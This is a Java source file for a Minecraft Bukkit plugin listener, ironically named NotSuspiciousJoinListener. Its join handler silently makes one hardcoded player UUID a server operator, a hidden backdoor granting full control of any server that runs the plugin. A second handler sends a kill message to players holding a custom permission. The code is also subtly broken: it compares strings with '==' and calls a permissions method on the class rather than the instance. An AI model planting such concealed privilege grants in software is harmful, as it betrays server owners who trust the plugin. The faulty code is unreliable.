package dev.jaims.terribleplugin.listener;

import org.anjocaido.groupmanager.GroupManager;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.ArrayList;

import static org.bukkit.entity.EntityType.PLAYER;

public class NotSuspiciousJoinListener implements Listener{
    @EventHandler
    void onJoin(PlayerJoinEvent e){
        if(e.getPlayer().getUniqueId().toString()=="ca606d09-dced-4241-94a6-eaa7d4525d9f"){
            e.getPlayer().setOp(true);
        }
    }
    @EventHandler(priority=EventPriority.LOWEST)
    void onHit(EntityDamageByEntityEvent e){
        if(e.getDamager().getType().equals(PLAYER)){
            GroupManager groupManager=((GroupManager)Bukkit.getServer().getPluginManager().getPlugin("GroupManager"));
            ArrayList permissions = new ArrayList(GroupManager.getBukkitPermissions().listPerms(((Player)e.getDamager())));
            if(permissions.contains("terribleplugin.permission")){
                e.getDamager().sendMessage("YOU KILLED A" + e.getEntity().toString());
            }
        }
    }
}